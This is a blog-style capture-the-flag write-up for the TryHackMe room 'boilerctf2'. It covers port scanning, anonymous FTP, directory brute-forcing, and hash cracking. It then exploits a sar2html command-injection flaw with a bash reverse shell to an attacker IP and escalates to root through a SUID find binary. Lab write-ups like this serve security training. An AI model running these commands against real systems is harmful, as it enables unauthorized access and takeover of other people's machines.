---
title: CTF tryhackme boilerctf2
categories: [CTF, THM, Medium]
tags: [ftp, http, ssh, linux_privesc]
date: 2024-03-06 08:00 +0700
---

In this room, we'll see an interesting medium level CTF from tryhackme

[https://tryhackme.com/r/room/boilerctf2](https://tryhackme.com/r/room/boilerctf2)

## nmap
- `sudo nmap -sS --min-rate=500 -T4 -sV --version-all -O --script=default -r -vv $IPTA -oN nmap_full_$IPTA -p- -Pn`
	- 21 FTP
		-  anonymous allowed
	- 80 HTTP
		- Apache httpd 2.4.18 ((Ubuntu))
	- 10000 HTTP
		- MiniServ 1.930 (Webmin httpd)
	- 55007 SSH

## FTP enumeration
- `ftp ftp://anonymous@$IPTA` log in as anonymous, download and cat file content (it's obviously ROT13 encoding)

![](/assets/img/img_thm_ctf_boilerctf2_1.png)
- decyphering it with CyberChef
![](/assets/img/img_thm_ctf_boilerctf2_2.png)

## Webmin enumeration
- `searchsploit Webmin` our server version is 1.930 (cf nmap). The thing is, there was a great unauthenticated RCE for version 1.920, and there are a few exploits for versions above, but nothing for our version. The "HTML Email Command Execution" only affects versions <1.080. So no, we can't exploit it.
![](/assets/img/img_thm_ctf_boilerctf2_3.png)

## http enumeration
- `feroxbuster -u http://$IPTA:80 -t 30 -w /usr/share/dirb/wordlists/common.txt -x txt,html,sql,csv,png,jpg,jpeg,php,js,md,sh,py,css,cgi,xml,aspx,zip,tar,tar.gz,bak dir -o "ferox_$IPTA"_80_common_all.txt` let's try to find hidden folders/files
- let's look at the robots.txt file (cf nmap)
![](/assets/img/img_thm_ctf_boilerctf2_4.png)
- the result of the blurred cypher is "kidding" -> CyberChef -> From Decimal -> From Base64 -> md5 hash -> cracking it with john
![](/assets/img/img_thm_ctf_boilerctf2_5.png)
![](/assets/img/img_thm_ctf_boilerctf2_6.png)
- `cat ferox_10.10.232.144_80_common_all.txt | grep -Ev "manual"`
![](/assets/img/img_thm_ctf_boilerctf2_7.png)
- we found a CMS folder!
- `feroxbuster -u http://$IPTA:80/joomla -t 30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,sql,csv,png,jpg,php,cgi,xml,zip,tar,bak dir -o "ferox_$IPTA"_80_joomla_med_3.txt` let's start a more detailed and precise forced browsing attack
- with all this enumeration, I found a few interesting folders `_files, _test, tmp, ~www`

## sar2html CVE exploit
- in `_test`, we get an interesting web module
![](/assets/img/img_thm_ctf_boilerctf2_8.png)
- searching for "sar2html", I found this CVE https://www.exploit-db.com/exploits/47204
- the exploit is quite simple to reproduce
![](/assets/img/img_thm_ctf_boilerctf2_9.png)
- our id command is executed! Can we get a reverse shell?
- let's replace "id" with `bash -c "bash -i >& /dev/tcp/10.11.64.57/56765 0>&1"` -> url encoded with CyberChef -> `bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E11%2E64%2E57%2F56765%200%3E%261%22`
- yes, we do get a reverse shell!
![](/assets/img/img_thm_ctf_boilerctf2_10.png)
- in log.txt, we get some SSH credentials
![](/assets/img/img_thm_ctf_boilerctf2_11.png)

# linux privesc
## password in bash script -> stoner
- `ssh basterd:$IPTA -p 55007`
- `cat backup.sh` in our user home, we get the credentials of an other user, in a bash script, as a comment
![](/assets/img/img_thm_ctf_boilerctf2_12.png)
- `su stoner`

## SUID script -> root
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -lah {} \; 2> /dev/null` we find an interesting SUID binary, find
	- cf https://gtfobins.github.io/gtfobins/find/#suid
![](/assets/img/img_thm_ctf_boilerctf2_13.png)
- now we just have to get the user.txt and root.txt flags
- `cat /root/root.txt; echo -e "\n"; cat /home/stoner/.secret`